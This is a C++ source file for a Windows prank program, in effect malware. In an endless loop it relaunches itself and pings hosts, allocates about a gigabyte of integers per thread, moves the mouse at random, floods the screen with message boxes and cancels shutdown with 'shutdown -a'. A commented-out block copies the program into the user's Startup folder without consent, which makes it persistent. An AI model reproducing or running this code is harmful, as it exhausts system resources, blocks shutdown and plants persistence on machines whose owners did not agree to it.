#include <string>
#include <Lmcons.h>
#include <windows.h>
#include <thread>
#include <random>
#include <vector>
#include <shellapi.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // uncomment the following code to copy the executable to the startup folder without the user's consent (hard to fix, needs to boot into safe mode to fix it)
    /*
    wchar_t path[MAX_PATH];
    if (GetModuleFileNameW(NULL, path, MAX_PATH)) {
		wchar_t username[UNLEN + 1];
		DWORD username_len = UNLEN + 1;
		GetUserNameW(username, &username_len);

		std::wstring command = L"copy \"";
		command += path;
		command += L"\" \"C:\\Users\\";
        		command += username;
                		command += L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"";
		_wsystem(command.c_str());
	}
    */


    // get the screen resolution
    int screen_width = GetSystemMetrics(SM_CXSCREEN);
    int screen_height = GetSystemMetrics(SM_CYSCREEN);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> disX(0, screen_width);
    std::uniform_int_distribution<> disY(0, screen_height);

    std::vector<std::thread> threads;
    // infinite loop to keep the program running
    while (true) {
        if (GetAsyncKeyState(VK_INSERT)) {  // exit the program if the insert key is pressed
            break;
        }

        // create a thread to open a youtube video, doesnt work i think but here anyways 
        threads.push_back(std::thread([]() {
            ShellExecute(NULL, L"open", L"https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWNORMAL);
        }));

        // create a thread to open a lot of message boxxes
        threads.push_back(std::thread([]() {
            MessageBoxA(NULL, "aukse loves you", "<3", MB_OK | MB_ICONERROR);
        }));

        // create a thread to let the app open itself again
        threads.push_back(std::thread([]() {
            system("test.exe");
        }));

        threads.push_back(std::thread([]() {
            system("ping maxiwee.de");
		}));

        threads.push_back(std::thread([]() {
			system("ping google.com");
		}));

        threads.push_back(std::thread([]() {
            int* arr = new int[1000000000];
        }));
        // mouse movement
        int x = disX(gen);
        int y = disY(gen);
        SetCursorPos(x, y);

        // thread to prevent shutdown, i am not sure if it works but it kinda does i think
        threads.push_back(std::thread([]() {
            system("shutdown -a");
        }));
    }

    // join all the threads
    for (auto& t : threads) {
        if (t.joinable()) {
            t.join(); 
        }
    }

    return 0;
}